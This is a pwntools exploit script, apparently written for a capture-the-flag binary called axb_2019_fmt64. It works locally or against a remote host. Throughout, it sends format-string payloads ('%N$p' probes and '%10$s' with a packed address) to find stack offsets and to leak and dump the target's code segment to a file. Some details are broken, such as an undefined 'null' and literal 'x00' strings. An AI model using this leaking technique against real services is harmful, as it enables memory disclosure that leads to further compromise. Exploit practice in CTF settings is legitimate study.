from pwn import *
import sys
context.arch='amd64'

# file_name=ELF("./")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
if args['REMOTE']:
    sh = remote(sys.argv[1], sys.argv[2])
else:
    sh = process("./axb_2019_fmt64")

def where_is_start(ret_index=null):
    return_addr=0
    for i in range(400):
        payload = '%%%d$p<--|' % (i)
        sh.recvuntil('Please tell me:')
        sh.sendline(payload)
        sh.recvuntil('Repeater:')
        val = sh.recvuntil('<--|')
        log.info(str(i*8).ljust(4)+' '+val.strip('<--|').ljust(10))
        if(i*4==ret_index):
            return_addr=int(val.strip('<--|').ljust(10)[2:],16)
            return return_addr
        # sh.recvrepeat(0.2)

def dump_text(start_addr=0):
    text_segment=''
    try:
        while True:
            payload = 'Leak--->%10$s<-|'+p64(start_addr)
            sh.recvuntil('Please tell me:')
            # gdb.attach(sh)
            sh.send(payload)
            sh.recvuntil('Repeater:Leak--->')
            value = sh.recvuntil('<-|').strip('<-|')
            text_segment += value
            start_addr += len(value)
            if(len(value)==0):
                text_segment += 'x00'
                start_addr += 1
            if(text_segment[-9:-1]=='x00'*16):
                break
    except Exception as e:
        print(e)
    finally:
        log.info('We get ' + str(len(text_segment)) +'byte file!')
        with open('axb_2019_fmt64_dump','wb') as fout:
            fout.write(text_segment)


start_addr=where_is_start(720)
start_addr=0x400720
# start_addr=0x400600
dump_text(start_addr)